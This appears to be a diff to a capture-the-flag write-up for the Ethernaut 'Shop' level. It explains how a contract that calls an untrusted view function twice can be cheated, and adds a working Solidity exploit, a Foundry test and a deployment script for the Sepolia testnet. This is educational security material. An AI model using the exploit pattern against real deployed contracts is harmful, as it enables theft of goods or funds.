@@ -1,4 +1,4 @@
-## Shop
+## 👾 21. Shop
 
 <br>
 
@@ -7,7 +7,13 @@
 
 <br>
 
-* in this challenge we explore restrictions of `view` functions through an `interface`. 
+* in this challenge we explore restrictions of `view` functions through an `interface`, similarly to level `11` for `Elevator`.
+  - now, the goal is to find a way to buy items from a `Shop` contract for a lower price when compared to sold items.
+
+<br>
+
+* remember that a `view` function **[cannot modify the state of the contract](https://docs.soliditylang.org/en/v0.8.15/contracts.html#view-functions)**. 
+  - for instance, it cannot write to state variables, create other contracts, emit events, send ether with `call()`, use any low-level calls, use `selfdestruct()`, call functions that `pure` or `view`, or use inline assembly with certain opcodes.
 
 
 <br>
@@ -50,8 +56,7 @@ contract Shop {
 
 <br>
 
-* the first bit of this contract is the `interface Buyer` that defines as `external view` function, `price()`:
-
+* the first part of this contract is the `interface Buyer` that defines as `external view` function, `price()`, representing the amount of `wei` a `Buyer` must pay:
 <br>
 
 ```solidity
@@ -73,7 +78,8 @@ bool public isSold;
 
 <br>
 
-* and a `public` function `buy()`, where the fact that `price()` is being called twice is our vulnerability:
+* and a `public` function `buy()`, where the `price()` is being called twice. 
+  - this is our vulnerability, as one should never trust external inputs (*e.g.,* coming from the `interface` implementation):
 
 <br>
 
@@ -90,29 +96,112 @@ function buy() public {
 
 <br>
 
+* in other words, `Shop` expects `Buyer` to return the price it is willing to pay to buy the item, believing that the price would not change the second time it called, as it is a `view` function.
+<br>
+
+* we will use this as our exploit, querying the value of `isSold()` and returning a different result based on our needs:
+  - the first time `price()` is called, it returns `>100` to enter the loop.
+  - then, the second time, it can return anything lower.
+
+
 ----
 
 ### solution
 
 <br>
 
-* we craft the following exploit:
+* we craft the following exploit at `src/21/ShopExploit.sol`:
 
 <br>
 
 ```solidity
+contract ShopExploit is Buyer {
 
+    Shop private level;
+
+    function price() external view returns (uint256) {
+        return level.isSold() ? 0 : 1337;
+    }
+
+    function run(Shop _level) public {
+        level = _level;
+        level.buy();
+    }
+}
 ```
 
 
 <br>
 
-* which can be submitted with `script/21/Shop.s.sol`:
+* check `test/21.Shop.t.sol` for testing this solution::
 
 <br>
 
 ```solidity
+contract ShopTest is Test {
 
+    Shop public level = new Shop();
+
+    address instance = payable(vm.addr(0x10053)); 
+    address hacker = vm.addr(0x1337); 
+
+    function setUp() public {
+
+        vm.prank(instance);
+        
+    }
+
+    function testShopHack() public {
+
+        vm.startPrank(hacker);
+
+        console.log(level.isSold());
+
+        ShopExploit exploit = new ShopExploit();
+        exploit.run(level);
+
+        assert(level.isSold());
+
+        vm.stopPrank();
+        
+    }
+}
+```
+
+<br>
+
+* running:
+
+<br>
+
+```shell
+> forge test --match-contract ShopTest -vvvv    
+```
+
+
+
+<br>
+
+* then, submit the solution with `script/21/Shop.s.sol`:
+
+<br>
+
+```solidity
+contract Exploit is Script {
+
+        address instance = vm.envAddress("INSTANCE_LEVEL21");
+        Shop level = Shop(instance);        
+        
+        function run() external {
+
+            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+
+            ShopExploit exploit = new ShopExploit();
+            exploit.run(level);
+            
+            vm.stopBroadcast();
+    }
+}
 ```
 
 <br>
@@ -124,6 +213,8 @@ function buy() public {
 ```shell
 > forge script ./script/21/Shop.s.sol --broadcast -vvvv --rpc-url sepolia
 ```
+
+
 
 <br>
 
